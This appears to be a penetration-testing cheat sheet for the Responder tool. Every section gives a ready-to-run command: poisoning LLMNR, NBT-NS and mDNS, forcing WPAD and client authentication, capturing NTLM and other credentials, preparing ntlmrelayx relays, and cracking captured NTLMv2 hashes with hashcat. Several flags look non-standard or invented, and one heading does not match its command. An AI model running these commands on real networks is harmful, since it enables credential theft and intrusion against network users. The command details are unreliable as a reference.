# Responder

> LLMNR/NBT-NS/mDNS poisoner for capturing NTLMv1/v2 hashes on the local network

<!-- tags: responder, ntlm, poison, mitm, network -->

---

## capture ntlm llmnr poison
Poison LLMNR, NBT-NS, and mDNS requests and capture NTLMv2 hashes.

```bash
sudo responder -I {{IFACE:iface:eth0}} -dwv
```

<!-- meta: risk=high | phase=exploit | tags=poison,ntlm,capture -->

---

## sniff passive analyze mode
Listen passively without poisoning to identify broadcast traffic and potential targets.

```bash
sudo responder -I {{IFACE:iface:eth0}} -A
```

<!-- meta: risk=safe | phase=recon | tags=analyze,passive -->

---

## capture wpad proxy auth
Force WPAD proxy authentication to capture additional credentials.

```bash
sudo responder -I {{IFACE:iface:eth0}} -dwv -F
```

<!-- meta: risk=high | phase=exploit | tags=wpad,proxy,capture -->

---

## poison selective protocols
Enable only specific poisoning protocols for targeted attacks.

```bash
sudo responder -I {{IFACE:iface:eth0}} -r -d -w -v
```

<!-- meta: risk=high | phase=exploit | tags=selective,protocols -->

---

## capture hashes save logs
Capture hashes with output logged to a specific directory (default: /usr/share/responder/logs/).

```bash
sudo responder -I {{IFACE:iface:eth0}} -dwv && ls /usr/share/responder/logs/
```

<!-- meta: risk=high | phase=exploit | tags=hashes,logs -->

---

## poison all interfaces
Poison across every interface (use with caution on multi-homed hosts).

```bash
sudo responder -I ALL
```

<!-- meta: risk=high | phase=exploit | tags=responder,all-interfaces -->

---

## force auth idle clients
Force clients to authenticate even when idle.

```bash
sudo responder -I {{IFACE:iface:eth0}} --force-auth
```

<!-- meta: risk=high | phase=exploit | tags=responder,force-auth -->

---

## capture ssl ssh pop3 creds
Enable SSL, SSH, and POP3 credential capture.

```bash
sudo responder -I {{IFACE:iface:eth0}} --ssl --pop --ssh
```

<!-- meta: risk=high | phase=exploit | tags=responder,ssl,ssh,pop3 -->

---

## run custom config
Launch Responder with custom configuration file.

```bash
sudo responder -I {{IFACE:iface:eth0}} -c {{CONFIG:file:/path/to/Responder.conf}}
```

<!-- meta: risk=high | phase=exploit | tags=responder,config -->

---

## disable smb wpad modules
Run Responder with SMB and HTTP disabled (e.g. when relaying separately).

```bash
sudo responder -I {{IFACE:iface:eth0}} --disable-smb --disable-wpad
```

<!-- meta: risk=high | phase=exploit | tags=responder,disable -->

---

## crack ntlmv2 hashcat
Crack captured NTLMv2 hash with Hashcat (mode 5600).

```bash
hashcat -m 5600 {{HASHFILE:file:Responder-Session.log}} {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}}
```

<!-- meta: risk=safe | phase=passwords | tags=responder,hashcat,ntlmv2 -->

---

## disable http smb ntlmrelayx
Disable HTTP/SMB so ntlmrelayx can take over those sockets.

```bash
sudo responder -I {{IFACE:iface:eth0}} --no-http --no-smb
```

<!-- meta: risk=high | phase=exploit | tags=responder,relay,ntlmrelayx -->
